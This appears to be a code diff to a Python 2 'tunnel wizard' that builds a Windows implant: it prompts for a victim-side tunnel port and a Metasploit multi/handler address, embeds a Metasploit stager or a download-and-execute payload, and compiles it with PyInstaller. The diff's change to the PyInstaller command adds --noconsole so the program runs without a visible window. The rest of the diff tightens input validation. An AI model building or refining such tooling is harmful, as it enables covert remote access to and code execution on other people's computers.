@@ -1,18 +1,12 @@
-
 #!/usr/bin/env python
 
 import os, random, string
 from subprocess import *
 
 def pyinstaller_compile(file_location):
-    pyinstall_command = "wine ~/.wine/drive_c/Python27/python.exe /usr/share/pyinstaller/pyinstaller.py  --onefile "
-    #--noconsole
+    pyinstall_command = "wine ~/.wine/drive_c/Python27/python.exe /usr/share/pyinstaller/pyinstaller.py  --onefile --noconsole"
     os.system(pyinstall_command + file_location)
 
-#def clean_up:
-    #mkdir dist
-    #copy pyinstaller dist exe to current dist
-    #create 
 def random_secret(length):
 
     chars = string.ascii_letters + string.digits + '!@#$%^&*()'
@@ -81,38 +75,45 @@ print "welcome to tunnel wizard"
 
 
 
-AES = -1
-while AES == -1:
+AES = "0"
+while not((AES == "1") or (AES == "2")):
     print "Please choose:"
     print " 1. New AES String"
     print " 2. Reused AES String"
     AES = raw_input('---->')
-
+    AES = AES.strip()
+    print AES
 if AES == "1":
     aes_secret = random_secret(16) 
 if AES == "2":
     print "Please enter AES secret"
     aes_secret = AES = raw_input('---->')
-
-print "Listen port for client tunnel on victim:"
-listen_port = raw_input('---->')
+listen_port = "A"
+while not(listen_port.isdigit()):
+    print "Listen port for client tunnel on victim:"
+    listen_port = raw_input('---->')
 
 print "Host is tunneld running on:"
 tunneld_addr = raw_input('------>')
 
-print "Port is tunneld running on:"
-tunneld_port = raw_input ('----->')
+tunneld_port = "A"
+while not(tunneld_port.isdigit()):
+
+    print "Port is tunneld running on:"
+    tunneld_port = raw_input ('----->')
 
 print "Address of metasploits multi handler:"
 multi_addr = raw_input ('----->')
 
-print "Port the handler on (make unqiue from tunnel local port):"
-multi_port = raw_input ('----->')
+multi_port = "A"
+while not(multi_port.isdigit()):
+    print "Port the handler on (make unqiue from tunnel local port):"
+    multi_port = raw_input ('----->')
 
 
-embed = "-1"
+embed = "0"
 
-while embed == "-1":
+while not((embed == "1") or (embed == "2")):
     print "Please choose:"
     print "1. Embed metasploit stager"
     print "2. Download and execute"
@@ -130,10 +131,11 @@ if embed == "2":
     shellcode = create_download_execute(stage_exe,stage_url)
 
 new_cert = "-1"
-while new_cert == "-1":
+while not((new_cert == "Y") or (new_cert == "N")):
 	print "Please choose:"
 	print "Y/N New generate new ssl cert?"
 	new_cert = raw_input ('----->')
+	new_cert = new_cert.upper()
 if not new_cert == "N":
 	os.system("openssl req -x509 -newkey rsa:2048 -keyout config/key.pem -out config/temp.pem -days 9999 -nodes")
 	os.system("cat config/key.pem config/temp.pem > config/cert.pem")
